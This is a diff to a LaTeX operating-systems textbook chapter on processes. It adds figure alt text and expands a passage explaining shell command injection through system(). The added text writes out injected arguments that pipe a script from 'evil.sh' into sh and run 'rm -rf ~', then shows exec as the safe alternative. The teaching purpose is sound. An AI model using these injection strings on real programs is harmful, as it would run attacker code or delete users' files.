@@ -182,7 +182,7 @@ Having said that, this address can be made constant, if a program is compiled wi
 
 \begin{figure}[H]
 \centering
-\includegraphics[width=.3\textwidth]{processes/drawings/address_space.eps}
+\includegraphics[width=.3\textwidth,alt={A process address space from bottom to top: text, data, heap, and stack. Arrows show the heap growing upward and the stack growing downward toward each other.}]{processes/drawings/address_space.eps}
 \caption{Process address space}
 \end{figure}
 
@@ -337,7 +337,7 @@ $ ./ssort 1 3 2 4
 
 \begin{figure}[H]
 \centering
-\includegraphics[width=.3\textwidth]{processes/drawings/sleepsort_timing.eps}
+\includegraphics[width=.3\textwidth,alt={Three successive fork calls create four processes that sleep for 1, 3, 2 and 4 seconds. Each prints its number and exits when it wakes, so the numbers are printed in sorted order: 1, 2, 3, 4.}]{processes/drawings/sleepsort_timing.eps}
 \caption{Timing of sorting 1, 3, 2, 4}
 \end{figure}
 
@@ -857,6 +857,16 @@ Also, \keyword{system} actually creates a shell that is then given the string, w
 The standard shell will use the \keyword{PATH} environment variable to search for a filename that matches the command.
 Using system will usually be sufficient for many simple run-this-command problems but can quickly become limiting for more complex or subtle problems, and it hides the mechanics of the fork-exec-wait pattern, so we encourage you to learn and use \keyword{fork} \keyword{exec} and \keyword{waitpid} instead.
 It also tends to be a huge security risk.
+The string is interpreted by a shell, so a single call to \keyword{system} can run more than one command:
+
+\begin{lstlisting}[language=C]
+#include <stdlib.h>
+int main() {
+    system("ls . ; echo I can run a second command ...");
+}
+\end{lstlisting}
+
+This prints the contents of the current directory, then the message.
 By allowing someone to access a shell version of the environment, the program can run into all sorts of problems:
 
 \begin{lstlisting}[language=C]
@@ -867,7 +877,14 @@ int main(int argc, char**argv) {
 }
 \end{lstlisting}
 
-Passing something along the lines of argv[1] = "; sudo su" is a huge security risk called \href{https://en.wikipedia.org/wiki/Privilege\_escalation}{privilege escalation}.
+Because \keyword{system} passes the whole string to a shell, the shell interprets any special characters in \keyword{argv[1]}.
+Passing something along the lines of \keyword{argv[1] = "; curl evil.sh | sh"} makes the program run \keyword{ls}, then download and run an attacker's script.
+Similarly, \keyword{argv[1] = "; rm -rf \textasciitilde"} deletes the user's home directory.
+This is called \href{https://en.wikipedia.org/wiki/Code\_injection\#Shell\_injection}{command injection}.
+The characters \keyword{;}, \keyword{|}, \keyword{\&\&}, \keyword{\$(...)} and backticks all let input start new commands, and even a filename containing a space is split into two arguments.
+In this example, the user could have typed those commands themselves, so nothing is gained.
+But if the program runs with more privilege than the person supplying the input -- a setuid program, or a server that builds the command from a web request -- command injection becomes \href{https://en.wikipedia.org/wiki/Privilege\_escalation}{privilege escalation}.
+Calling \keyword{exec} directly, for example \keyword{execlp("ls", "ls", argv[1], (char *) NULL)}, avoids the problem because no shell ever interprets the argument: it is passed to \keyword{ls} as a single word.
 
 \section{The fork-exec-wait Pattern}
 
@@ -878,7 +895,7 @@ Meanwhile, the parent uses \keyword{wait} (or \keyword{waitpid}) to wait for the
 
 \begin{figure}[H]
 \centering
-\includegraphics[width=.7\textwidth]{processes/drawings/fork_exec_wait.eps}
+\includegraphics[width=.7\textwidth,alt={The parent calls fork. The child branches off and calls exec to run a new program while the parent calls wait, and the parent continues once the child finishes.}]{processes/drawings/fork_exec_wait.eps}
 \caption{Fork, exec, wait diagram}
 \end{figure}
 
